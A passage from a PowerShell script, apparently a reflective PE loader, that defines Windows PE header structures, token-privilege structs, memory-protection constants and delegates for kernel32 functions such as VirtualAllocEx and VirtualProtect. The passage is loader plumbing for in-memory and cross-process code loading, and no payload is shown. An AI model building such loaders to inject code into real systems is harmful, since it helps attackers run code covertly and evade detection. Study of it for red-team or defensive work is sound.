		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
